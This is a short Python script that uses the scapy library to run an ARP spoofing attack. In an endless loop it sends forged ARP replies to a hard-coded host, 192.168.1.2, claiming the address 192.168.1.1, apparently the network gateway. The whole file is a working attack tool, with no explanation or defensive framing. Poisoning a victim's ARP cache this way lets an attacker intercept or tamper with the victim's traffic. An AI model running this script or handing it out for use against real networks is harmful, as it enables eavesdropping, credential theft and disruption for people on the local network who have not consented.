from scapy.all import *

def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)

def get_mac(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src

target_ip = "192.168.1.2"
spoof_ip = "192.168.1.1"
while True:
    arp_spoof(target_ip, spoof_ip)
    time.sleep(2)
